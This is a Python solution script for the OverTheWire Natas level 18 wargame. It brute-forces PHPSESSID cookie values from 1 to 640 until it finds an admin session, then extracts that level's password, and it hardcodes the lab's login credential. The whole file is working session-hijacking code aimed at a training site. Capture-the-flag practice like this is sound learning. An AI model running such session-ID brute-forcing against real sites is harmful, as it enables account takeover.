import requests
import re

username = 'natas18'
password = '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq'

url = 'http://%s.natas.labs.overthewire.org' % username

with open('natas18.html', 'w+') as out:
    # payload = {'username': 'admin', 'password': 'admin'}
    # req_create_session = requests.post(
    #     url, auth=(username, password), data=payload)
    for session_id in range(1, 641):
        cookie = {'PHPSESSID': str(session_id)}
        res = requests.get(url, auth=(username, password),
                           cookies=cookie)
        content = res.text
        if ("You are an admin" in content):
            print("PHPSESSID: ", session_id)
            flag = re.findall(
                'Password: (.*)</pre>', content)[0]
            out.write(content)
            print('password:', flag)
            break
        # else:
            # print("trying", session_id)
